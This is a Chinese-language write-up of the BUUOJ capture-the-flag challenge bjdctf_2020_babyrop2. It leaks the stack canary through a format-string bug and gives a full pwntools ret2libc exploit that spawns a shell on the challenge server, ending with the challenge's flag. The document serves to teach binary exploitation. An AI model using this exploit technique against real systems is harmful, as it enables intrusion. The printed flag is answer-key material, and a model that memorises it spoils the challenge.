# bjdctf_2020_babyrop2

[题目地址](https://buuoj.cn/challenges#bjdctf_2020_babyrop2)

其实没什么新知识点，不过想趁这个帖子总结一下之前遇到的小细节。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

canary，那么出题人要用什么方式来帮助我们泄露呢？

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  gift();
  vuln();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

看看送了什么好玩意。

```c
void gift(void)

{
  long in_FS_OFFSET;
  char local_18 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("I\'ll give u some gift to help u!");
  __isoc99_scanf(&%6s,local_18);
  printf(local_18);
  puts("");
  fflush((FILE *)0x0);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

格式化字符串啊，没什么创意但是我很喜欢。

```c
void vuln(void)

{
  long in_FS_OFFSET;
  undefined local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Pull up your sword and tell me u story!");
  read(0,local_28,100);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

更没有创意了。先考虑如何泄露canary，也就是找格式化字符串的偏移。之前习惯那种几个a加上一堆%p找偏移的办法，现在限制只有6个字符一时间不知道怎么找。在gdb的插件pwndbg中有fmtarg的命令，但是我是原生gdb。思考片刻，发现也很简单。local_18的位置是rbp-0x10，ida直接看，ghidra可以往下翻找到local_18的引用，里面就有相对位置。

```
        00400835 48 8d 45 f0     LEA        RAX=>local_18,[RBP + -0x10]
```

我们要泄露的对象在rbp-0x8，所有64位程序canary的位置都是这个，32位则是ebp-0x4。然后随便找个地方下断点，我这里找了printf刚调用完后，应该哪里都行的。

```
Breakpoint 5, 0x000000000040085c in gift ()
(gdb) x/s $rbp-0x10
0x7fffc39aa760: "a"
(gdb) x/s $rbp-0x8
0x7fffc39aa768: ""
```

canary是0x7fffc39aa768，local_18在0x7fffc39aa760，计算偏移的公式是 目标位置-格式化字符串位置-1，也就是%7\$p，%7表示打印相对当前格式化字符串位置的第7个内容，$p表示以指针形式（这个不太确定，这个参数在64位按8个，32位按4个打印，遵循字长）。canary搞定，整个程序里使用的canary都是一样的，所以不用担心gift函数里得到的canary在vuln不能用。

然后老生常谈的泄露地址ret2libc。注意64位的地址永远以\x7f开头，所以recvuntil('\x7f')很好用；同时接收到的字节一般不足8位，ljust(8,b'\x00')完美解决。recvuntil有个可选参数是drop，设置为true就会丢掉参数设定的字符，比如recvuntil('\n')的结果是xxx\n，而recvuntil('\n',drop=True)的结果是xxx。

```python
from pwn import *
p = remote('node4.buuoj.cn',29807)
puts_plt=0x00400610
puts_got=0x00601018
pop_rdi=0x0000000000400993
payload='%7$p'
p.sendline(payload)
p.recvuntil('0x',drop=True)
canary=int(p.recvuntil('\n',drop=True),16)
payload=b'a'*(0x28-16)+p64(canary)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x00400887)
p.sendlineafter("Pull up your sword and tell me u story!\n",payload)
puts_addr=u64(p.recvuntil('\x7f').ljust(8,b'\x00'))
libc_base=puts_addr-456336
system_addr=libc_base+283536
binsh=libc_base+0x000000000018cd57
payload=b'a'*(0x28-16)+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(system_addr)+p64(0x00400887)
p.sendline(payload)
p.interactive()
```

### Flag
> flag{3c7a693b-ffeb-4287-891d-388052d020e9}